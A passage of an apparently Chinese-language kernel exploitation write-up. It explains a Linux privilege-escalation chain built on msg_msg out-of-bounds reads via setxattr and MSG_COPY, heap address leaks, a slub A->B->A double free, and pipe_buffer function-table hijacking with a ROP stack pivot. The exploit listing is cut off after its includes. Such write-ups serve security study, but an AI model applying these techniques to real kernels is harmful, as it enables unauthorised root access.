class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>DEFINE_WAKE_Q(wake_q);<br><br>ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br><span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>msg = load_msg(mtext, msgsz);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT;<br><span class="hljs-type">size_t</span> alen;<br><br>msg = alloc_msg(len);<br></code></pre></td></tr></table></figure><p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>我们不难想到的是，我们可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改其 header 中的 <code>m_ts</code> 成员，<strong>从而实现堆上的越界数据读取</strong>，同时还能通过修改 msg_msg-&gt;next <strong>实现任意地址读</strong></p><p>但是这样有一个问题，当我们调用 msgrcv 接受消息时，其会调用 <code>list_del()</code> 将对应的 msg_msg 结构体从双向链表中 unlink，<strong>此时我们并不知道内核空间中的任何地址，因此内核会在 unlink 时 panic 掉</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    list_del(&amp;msg-&gt;m_list);<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">goto</span> out_unlock0;<br><span class="hljs-comment">//...</span><br>out_unlock0:<br>ipc_unlock_object(&amp;msq-&gt;q_perm);<br>wake_up_q(&amp;wake_q);<br>out_unlock1:<br>rcu_read_unlock();<br><span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>free_copy(copy);<br><span class="hljs-keyword">return</span> PTR_ERR(msg);<br>&#125;<br><br>bufsz = msg_handler(buf, msg, bufsz);<br>free_msg(msg);<br><br><span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们需要想一个方法既能读出 msg_msg 中数据又不会让其被非法 unlink 掉，阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br><span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br><span class="hljs-keyword">return</span> -EINVAL;<br>copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br><span class="hljs-keyword">if</span> (IS_ERR(copy))<br><span class="hljs-keyword">return</span> PTR_ERR(copy);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment"> * not update queue parameters.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>msg = copy_msg(msg, copy);<br><span class="hljs-keyword">goto</span> out_unlock0;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据</p><p>接下来我们思考如何进行“合法”的搜索，我们先来看 <code>copy_msg</code> 的逻辑，其拷贝时判断待数据长度的逻辑<strong>主要是看 next 指针</strong>，因此若我们的 next 指针为一个非法地址，则会在解引用时导致 kernel panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *src, <span class="hljs-keyword">struct</span> msg_msg *dst)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">dst_pseg</span>, *<span class="hljs-title">src_pseg</span>;</span><br><span class="hljs-type">size_t</span> len = src-&gt;m_ts;<br><span class="hljs-type">size_t</span> alen;<br><br><span class="hljs-keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br>alen = min(len, DATALEN_MSG);<br><span class="hljs-built_in">memcpy</span>(dst + <span class="hljs-number">1</span>, src + <span class="hljs-number">1</span>, alen);<br><br><span class="hljs-keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;<br>     src_pseg != <span class="hljs-literal">NULL</span>;<br>     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;<br><br>len -= alen;<br>alen = min(len, DATALEN_SEG);<br><span class="hljs-built_in">memcpy</span>(dst_pseg + <span class="hljs-number">1</span>, src_pseg + <span class="hljs-number">1</span>, alen);<br>&#125;<br><br>dst-&gt;m_type = src-&gt;m_type;<br>dst-&gt;m_ts = src-&gt;m_ts;<br><br><span class="hljs-keyword">return</span> dst;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们需要确保<strong>获得一个合法的堆上地址进行搜索的同时</strong>确保我们所构造的<strong>next 链上皆为合法地址，并以 NULL 结尾</strong>，如何找到这样一个地址？</p><p>我们都知道，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/sla</span> <br>Password: <br>slabinfo - version: 2.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="hljs-built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br>kmalloc-1k          3341   3584   1024   16    4 : tunables    0    0    0 : slabdata    224    224      0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br></code></pre></td></tr></table></figure><p>我们不难想到的是，若是我们<strong>分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上</strong>，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，<strong>则很容易读取到其他的 msg_msg 结构体的数据</strong>，其 m_list 成员可以帮助我们泄露出一个堆上地址</p><p>那么这个堆上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>此时我们不难想到，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong>，之后我们在搜索时便可以选择从该地址开始搜索，这样我们就能知道每次搜索时获得的每一条数据的地址，<strong>从而在每次搜索时能够挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得连续的搜索内存的能力</p><p>但是这有一个小要求，我们在泄露 msg_msg 地址时应当选取 msg_queue-&gt;q_message 往前的一块为 NULL 的区域作为 msg_msg-&gt;next，不过令笔者欣喜的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时<strong>为 NULL</strong>，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置</p><p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p><p>泄露出 msg_msg 的地址之后就可以开始愉快的内存搜索了，至于在泄露出内核代码段上指针后如何计算出内核代码段基址，笔者这里的做法比较笨：将经常出现的内核指针做成一个字典，之后直接 query 即可，若字典未命中则继续搜索</p><blockquote><p>可能有的人会想到一个更为快捷的办法：因为我们已经获得了内核的“堆上地址”，所以我们可以去猜测“堆的基址”（<code>page_offset_base</code>），在 <code>page_offset_base + 0x9d000</code> 处<strong>固定存放着</strong> <code>secondary_startup_64</code> 函数的地址，而这个地址前面刚好有一片为 0 的区域方便我们的 next 指针进行指向</p><p>但这个做法有一定的风险：若是我们猜错了则很容易导致 kernel panic，且经笔者尝试会在我们的下一步中<strong>导致 kernel panic</strong>（也可能是笔者的构造存在缺陷），所以笔者还是更推荐大家只用内存搜索的办法</p></blockquote><h3 id="Step-III-构造-A-B-A-式-freelist-劫持新的结构体">Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体</h3><p>现在地址泄露的工作已经完成了，接下来我们来考虑如何进行提权，比较朴素的提权方法有两种：修改进程 cred 结构体或是劫持内核执行流</p><p>对于前一种方法我们需要获得内核中的任意地址写，可能此时有的同学已经想到了利用 userfaultfd + msg_msg 这一任意写方法，而现在我们有着内存搜索技术，自然可以直接使用 prctl 设置 task_struct 的 comm 成员后进行暴力搜索，但首先<strong>我们并不知道 PCB 地址在当前已知堆地址的前方还是后方</strong>，无论搜索前向越界还是后向越界到了非法地址都会引起 kernel panic，且自内核版本 5.11 起 <strong>userfaultfd 系统调用被限制为 root 权限才能使用</strong>，因此笔者选择控制一些有着函数指针的结构体从而劫持内核执行流</p><p>那么我们要将该 object 分配到别的地方，还要能对其进行修改，那么我们<strong>必须要先将该 object 放回 slub 中</strong>，因为此时该 object 虽为 free 状态，但当我们将其分配到别的结构体上后<strong>我们便无法再控制其内容</strong>，因为此时原 msg_msg 结构体的数据会被新结构体覆盖，<strong>无法正常被释放</strong>（过不了 msgrcv 中的 unlink）</p><p>因此接下来我们的工作便是先维修 msg_msg 中的双向链表，让其指向内核堆上一个合法的地址，同时让 next 指针为 NULL 即可，这里我们可以直接选择使用 setxattr 完成修复，可能有的同学这里会有疑问：m_list 成员位于 msg_msg 的前 16 字节，在 setxattr 将其放回 slub 时<strong>难道不会又将其修改为一个 slub 中的指针从而破坏双向链表么</strong>？开启了 hardened freelist 保护时 free object 的 next 指针字面量并非一个合法地址。这里我们就要说到 slub 的一个特性了：</p><ul><li>不同于 glibc 中空闲堆块固定使用前 8 字节的组织方式，在 slub 中空闲的 object 在其对应的 kmem_cache-&gt;offset 处存放下一个 free object 的指针（开启了 hardened freelist 保护时该值为当前 object 与 下一个 object 地址再与一个 random 值总共三个值进行异或的结果）</li></ul><p>经笔者多次测试，对于这种较大的 object 而言，其 offset 通常会大于 msg_msg header 的大小，因此我们可以进行完美修复</p><p>修复完成之后我们考虑如何进行 double free，因为 slub 的释放函数并没有太多的保护，如同 glibc 中的 fastbin 一般只会检查 freelist 上的第一个 object，因此我们只需要像做用户态 pwn 题那样构造 A-&gt;B-&gt;A 的释放链便能将 UAF 再应用到其他内核结构体上</p><h3 id="Step-IV-pipe-buffer-劫持-RIP">Step.IV pipe_buffer 劫持 RIP</h3><p>最后我们来挑选一个内核结构体来劫持 RIP，这里笔者选择了 <code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：前面我们在搜索内存时获取到了其中一个 msg_msg 的地址，只需要减去其与被用于 UAF 的 object 的地址之间的偏移即可，这个偏移值在搜索过程中是可以计算出来的</p><p>之后我们将函数表劫持到 pipe_buffer 所处 object 上，在该 object 上布置好 ROP 链，再选一条合适的用于栈迁移的 gadget 即可</p><p>经笔者实测，此时的 rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> 